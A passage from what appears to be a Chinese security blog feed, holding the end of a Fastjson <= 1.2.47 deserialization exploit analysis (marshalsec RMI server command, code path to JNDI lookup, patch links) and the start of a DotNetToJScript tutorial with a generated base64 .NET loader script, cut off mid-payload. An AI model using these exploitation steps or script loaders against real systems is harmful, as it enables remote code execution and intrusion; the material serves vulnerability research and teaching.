     exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>RMI服务器由<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code>启动<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8001/\<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure></p><p><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/B680A661-76AE-438F-BB0D-D2C2214F4A67.png" alt="7f359d16876b2eaa97d0064163818915"><br>运行exp的时候，发现并不能成功执行<br>因为jdk版本不支持，当前版本为8u191，ldap和rmi的方式都不行，切换版本到7u80</p><p><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/E79CF324-93FC-4CE1-BE1B-DFEF90EB9AF7.png" alt="1edd992c19ef12dba70c2e95888c2557"></p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>程序最先进入到<code>DefaultJSONNParser</code>，将整个payload作为参数传入Json的解释器，进入到<code>DefaultJsonParser.parser()</code>函数<br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/28FE6040-A663-4917-9B33-5FFF2CDB85BC.png" alt="6e56c3da292b27f3113a3ee0abaa98ee"></p><p>经过逐位的数据读取，将Json的Key分割开，调用<code>addSymbol()</code>函数加入到<code>symbolTable</code><br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/529DB604-D9A5-4738-B262-866E5A051044.png" alt="82ce67277b809a6566d42776edf55c1a"><br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/5C90CF8E-8639-47B0-8A2B-70CCAFB5BD96.png" alt="0b36d6845ac592e5e2a1edd046485417"><br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/6D7B5F66-9CF9-4F83-B579-1C5A50AC7EF3.png" alt="d7aaede895bd86db6cd8b3b2bf521090"></p><p>如果获取到的key是<code>@type</code>，就通过<code>clazz = this.config.checkAutoType(typeName, (Class)null, lexer.getFeatures())</code>是否是黑名单中的类<br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/575BDF20-3477-41EF-86A1-37C4F82D0C0D.png" alt="e54434863810d533e4abbfffd17cf444"></p><p>因为<code>@type == &quot;java.lang.class</code>，不在黑名单内，所以会将value带入加载<br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/010E81DB-CC0B-463D-99D5-3AF7B4424D0F.png" alt="c0cec95a77c1fcb09eae7a31f55ad924"></p><p>跟进deserializer<br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/6768D0AC-556B-4F32-8501-883DC598C4D2.png" alt="cd2a71923e82d11b89acf17a93dac732"></p><p>可以看到StrVal = objVal，而objVal就是等于poc中给出的val参数</p><p><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/901E4F52-7331-40E0-81CD-D0B69505C262.png" alt="b430f5adbde2b365f5488b65dd344da4"><br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/41CFF0FE-DC60-4991-8B01-21FF0131FC03.png" alt="c91078c017a755f6a5eafa795011e9b4"></p><p>然后下面经过一堆if判断，进入到<br><code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code><br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/8283EB70-1319-4470-9568-666FBD873996.png" alt="e609abb525e01030d936b3bbe7add652"><br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/AF8AAF33-B7F5-43E7-BE88-156D470E8346.png" alt="a98059fd01221035ecd2841522af4275"></p><p>跟进<code>loadClass()</code><br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/C69E1B97-C258-4C9C-81F5-296B60425223.png" alt="d4728569a9c8cb904ad5b0e1d4b6a6df"></p><p>MiscCode:548行<br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/F2E2E046-ADFD-4EEB-92CB-37DCDED33271.png" alt="79065bc4bef1123ed26820efacfbd05d"></p><p>最后进入JdbcRowSetImpl通过调用SetAutoCommit() -&gt; connect()对dataSourceName进行lookup，实现rmi注入<br><code>com/alibaba/fastjson/parser/DefaultJSONParser.class</code><br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/33674652-BC80-4F07-9490-3141F00F2A62.png" alt="d8ddb20ca9fbd8f657af97ef9c32ed6c"></p><p><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/AA25BA2D-3AAC-4AF3-8A48-89D90D64DE94.png" alt="b09fa3f3e107fafb1e34e3fb83ba5656"></p><p><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/0D7B889B-8F73-47A0-A043-B6CCAC90DF55.png" alt="a16b595ff0b2dc967bca9c66a947d82a"></p><h2 id="0x03-流程"><a href="#0x03-流程" class="headerlink" title="0x03 流程"></a>0x03 流程</h2><p><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/C0337364-B681-4CBE-95D1-38D3DD294B50.png" alt="041e5d8c0bb564c73c5b2a608fc6756f"></p><h2 id="0x04-Patch"><a href="#0x04-Patch" class="headerlink" title="0x04 Patch"></a>0x04 Patch</h2><p><a href="https://github.com/alibaba/fastjson/commit/11b92d9f33119ca2af1a3fe6f474de5c1810e686#diff-d09347575523cbca09b52606214d95a7" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/commit/11b92d9f33119ca2af1a3fe6f474de5c1810e686#diff-d09347575523cbca09b52606214d95a7</a></p><p><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/E04A36F0-B79B-416F-9AE7-B594B243388C.png" alt="013ef4165b6fced9afd44595f1ed8d44"><br>将cache设为了false</p><p><a href="https://github.com/alibaba/fastjson/commit/8034935a5405a135e77caa1e2f61b3e78fc02da8" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/commit/8034935a5405a135e77caa1e2f61b3e78fc02da8</a><br><img src="/Fastjson =&lt; 1.2.47 反序列化漏洞分析.resources/5CD5FE20-C4B0-4F9E-9744-02AC5B9B52A2.png" alt="ed8072ff15344186d6fe82a1030ddf3a"></p><h2 id="0x05-相关链接"><a href="#0x05-相关链接" class="headerlink" title="0x05 相关链接"></a>0x05 相关链接</h2><p><a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">https://www.03sec.com/3240.shtml</a><br><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a><br><a href="https://javasec.org/javase/JNDI/" target="_blank" rel="noopener">https://javasec.org/javase/JNDI/</a><br><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a><br><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-3-14 23:08:55&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/33703665.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="FastJson" scheme="http://patrilic.top/categories/FastJson/"/>
    
    
      <category term="FastJson" scheme="http://patrilic.top/tags/FastJson/"/>
    
  </entry>
  
  <entry>
    <title>DotNetToJScript &amp;&amp; GadgetToJScript</title>
    <link href="http://patrilic.top/2020/03/10/DotNetToJScript%20&amp;&amp;%20GadgetToJScript/"/>
    <id>http://patrilic.top/2020/03/10/DotNetToJScript &amp;&amp; GadgetToJScript/</id>
    <published>2020-03-10T09:48:22.000Z</published>
    <updated>2020-03-10T09:58:38.565Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-03-10 17:48:22</p></blockquote><p><img src="/wallpaper/girl_umbrella_rain.jpg" alt></p><h2 id="0x00-First-of-All"><a href="#0x00-First-of-All" class="headerlink" title="0x00 First of All"></a>0x00 First of All</h2><p><code>DotNetToJScript</code>和<code>GadgetToJScript</code>两个项目都可以将.Net程序封装在VBS或JS脚本中执行。</p><h2 id="0x01-DotNetToJScript"><a href="#0x01-DotNetToJScript" class="headerlink" title="0x01 DotNetToJScript"></a>0x01 DotNetToJScript</h2><h3 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h3><p><strong>Github</strong>: <a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">https://github.com/tyranid/DotNetToJScript</a></p><p>.Net 框架版本设置为 2.0<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/B1113037-3EC1-4834-8D1C-7CCA24F5B441.png" alt="058f3d723cd0ca2e7485f1d7216ac3c3"></p><p>报错：<br><strong>缺少程序集引用Linq</strong></p><p>解决方法：<br>添加引用 C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Core.dll<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/EB5B5FC7-8B78-4760-B987-D75E1EA5B1CF.png" alt="ea1a5641956a7a28b2c0b406c4aba31b"></p><p>编译成功后，生成两个文件夹：<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/224550E5-0CF0-4FB2-BA22-71F851DECF61.png" alt="a8b20407d74ef46db31d6f6fb25aea3a"></p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p>打开ExampleAssembly的cs源文件<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/4E5547AC-A42A-4474-8074-D1877D264A96.png" alt="4fb98a768dd4466219da984e3e33668a"></p><p>可以看到其实只是调用了MessageBox()函数，弹出一个框，先利用这个Dll进行测试<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/EA43F55B-3774-4048-BD03-7D976B3461A0.png" alt="a6dd3c16e5364d4551644edce13ff04f"></p><h4 id="ToJS"><a href="#ToJS" class="headerlink" title="ToJS"></a>ToJS</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe -o test.js ExampleAssembly.dll</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/B232AF55-CDEE-42D9-86C7-5C2A65A31E68.png" alt="d8d99c7eca3c63409950aa5c58b28188"></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/D0A4CE12-463B-4D8D-8ECB-5970A4DA9DED.png" alt="af601612607744683f8090933703b42b"></p><p>打开test.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setversion</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params">s</span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64ToStream</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> enc = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Text.ASCIIEncoding"</span>);</span><br><span class="line"><span class="keyword">var</span> length = enc.GetByteCount_2(b);</span><br><span class="line"><span class="keyword">var</span> ba = enc.GetBytes_4(b);</span><br><span class="line"><span class="keyword">var</span> transform = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Security.Cryptography.FromBase64Transform"</span>);</span><br><span class="line">ba = transform.TransformFinalBlock(ba, <span class="number">0</span>, length);</span><br><span class="line"><span class="keyword">var</span> ms = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.IO.MemoryStream"</span>);</span><br><span class="line">ms.Write(ba, <span class="number">0</span>, (length / <span class="number">4</span>) * <span class="number">3</span>);</span><br><span class="line">ms.Position = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> ms;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> serialized_obj = <span class="string">"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"</span>+</span><br><span class="line"><span class="string">"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"</span>+</span><br><span class="line"><span class="string">"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"</span>+</span><br><span class="line"><span class="string">"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"</span>+</span><br><span class="line"><span class="string">"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"</span>+</span><br><span class="line"><span class="string">"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"</span>+</span><br><span class="line"><span class="string">"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"</span>+</span><br><span class="line"><span class="string">"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"</span>+</span><br><span class="line"><span class="string">"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"</span>+</span><br><span class="line"><span class="string">"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"</span>+</span><br><span class="line"><span class="string">"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"</span>+</span><br><span class="line"><span class="string">"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"</span>+</span><br><span class="line"><span class="string">"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"</span>+</span><br><span class="line"><span class="string">"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"</span>+</span><br><span class="line"><span class="string">"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"</span>+</span><br><span class="line"><span class="string">"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"</span>+</span><br><span class="line"><span class="string">"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"</span>+</span><br><span class="line"><span class="string">"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"</span>+</span><br><span class="line"><span class="string">"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"</span>+</span><br><span class="line"><span class="string">"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"</span>+</span><br><span class="line"><span class="string">"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"</span>+</span><br><span class="line"><span class="string">"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"</span>+</span><br><span class="line"><span class="string">"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMADRBnXgAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAA4AAiIAsBMAAACgAAAAgAAAAAAAAaKAAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAyCcA"</span>+</span><br><span class="line"><span class="string">"AE8AAAAAQAAADAQAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAJAmAAAcAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAALnRleHQAAAAgCAAAACAAAAAKAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAADAQAAABA"</span>+</span><br><span class="line"><span class="string">"AAAABgAAAAwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAPwnAAAAAAAASAAAAAIABQB4IAAAGAYAAAEAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcgIoDgAACgAA"</span>+</span><br><span class="line"><span class="string">"cgEAAHByAQAAcBYfMCgPAAAKJiomAAMoEAAACiYqAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3"</span>+</span><br><span class="line"><span class="string">"AAAAAAUAbAAAAAQCAAAjfgAAcAIAAIACAAAjU3RyaW5ncwAAAADwBAAADAAAACNVUwD8BAAAEAAA"</span>+</span><br><span class="line"><span class="string">"ACNHVUlEAAAADAUAAAwBAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAUAAAA"</span>+</span><br><span class="line"><span class="string">"AgAAAAIAAAABAAAAEAAAAA4AAAABAAAAAwAAAAAAZAEBAAAAAAAGANQA2AEGAEEB2AEGACEApgEP"</span>+</span><br><span class="line"><span class="string">"APgBAAAGAEkAjgEGALcAjgEGAJgAjgEGACgBjgEGAPQAjgEGAA0BjgEGAGAAjgEGADUAuQEGABMA"</span>+</span><br><span class="line"><span class="string">"uQEGAHsAjgEGAEMCeAEKAGICBwIKAEoCBwIKABwCBwIKAH8BBwIOADsCpgEAAAAAAQAAAAAAAQAB"</span>+</span><br><span class="line"><span class="string">"AAEAEAAuAgAAPQABAAEAUCAAAAAAhhigAQYAAQBtIAAAAACGADgCEAABAAAAAQBfAQkAoAEBABEA"</span>+</span><br><span class="line"><span class="string">"oAEGABkAoAEKACkAoAEQADEAoAEQADkAoAEQAEEAoAEQAEkAoAEQAFEAoAEQAFkAoAEQAGEAoAEV"</span>+</span><br><span class="line"><span class="string">"AGkAoAEQAHEAoAEQAHkAoAEGAIEAXQIaAKEAVwIlAC4ACwA0AC4AEwA9AC4AGwBcAC4AIwBlAC4A"</span>+</span><br><span class="line"><span class="string">"KwB6AC4AMwCkAC4AOwCkAC4AQwBlAC4ASwCqAC4AUwCkAC4AWwCkAC4AYwDPAC4AawD5AEMAWwAG"</span>+</span><br><span class="line"><span class="string">"AQSAAAABAAAAAAAAAAAAAAAAAG0CAAACAAAAAAAAAAAAAAArAAoAAAAAAAIAAAAAAAAAAAAAACsA"</span>+</span><br><span class="line"><span class="string">"BwIAAAAAAgAAAAAAAAAAAAAAKwB4AQAAAAAAAAA8TW9kdWxlPgBtc2NvcmxpYgBHdWlkQXR0cmli"</span>+</span><br><span class="line"><span class="string">"dXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxl"</span>+</span><br><span class="line"><span class="string">"QXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25B"</span>+</span><br><span class="line"><span class="string">"dHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRp"</span>+</span><br><span class="line"><span class="string">"b25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1"</span>+</span><br><span class="line"><span class="string">"Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0"</span>+</span><br><span class="line"><span class="string">"cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHBhdGgARXhhbXBsZUFzc2VtYmx5"</span>+</span><br><span class="line"><span class="string">"LmRsbABTeXN0ZW0ATWVzc2FnZUJveEljb24AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVt"</span>+</span><br><span class="line"><span class="string">"LkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGlt"</span>+</span><br><span class="line"><span class="string">"ZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFN5c3RlbS5XaW5kb3dzLkZvcm1zAE1l"</span>+</span><br><span class="line"><span class="string">"c3NhZ2VCb3hCdXR0b25zAFRlc3RDbGFzcwBSdW5Qcm9jZXNzAE9iamVjdABEaWFsb2dSZXN1bHQA"</span>+</span><br><span class="line"><span class="string">"U3RhcnQAU2hvdwBNZXNzYWdlQm94AEV4YW1wbGVBc3NlbWJseQAAAAAACVQAZQBzAHQAAADj3KEj"</span>+</span><br><span class="line"><span class="string">"e42OT40NcZVxyoeHAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIKAAQRRQ4OEUkRTQUAARJRDgi3"</span>+</span><br><span class="line"><span class="string">"elxWGTTgiQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQAHAQAAAAAU"</span>+</span><br><span class="line"><span class="string">"AQAPRXhhbXBsZUFzc2VtYmx5AAApAQAkRXhhbXBsZSBBc3NlbWJseSBmb3IgRG90TmV0VG9KU2Ny"</span>+</span><br><span class="line"><span class="string">"aXB0AAAFAQAAAAAkAQAfQ29weXJpZ2h0IMKpIEphbWVzIEZvcnNoYXcgMjAxNwAAKQEAJDU2NTk4"</span>+</span><br><span class="line"><span class="string">"ZjFjLTZkODgtNDk5NC1hMzkyLWFmMzM3YWJlNTc3NwAADAEABzEuMC4wLjAAAAUBAAEAAAAAAAAM"</span>+</span><br><span class="line"><span class="string">"EGdeAAAAAAIAAAAcAQAArCYAAKwIAABSU0RTyVZuj/N+iUu1llptRFdfnAEAAABDOlxVc2Vyc1xQ"</span>+</span><br><span class="line"><span class="string">"YXRyaWxpY1xEZXNrdG9wXERvdE5ldFRvSlNjcmlwdFxFeGFtcGxlQXNzZW1ibHlcb2JqXERlYnVn"</span>+</span><br><span class="line"><span class="string">"XEV4YW1wbGVBc3NlbWJseS5wZGIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAPAnAAAAAAAAAAAAAAooAAAAIAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAD8JwAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span 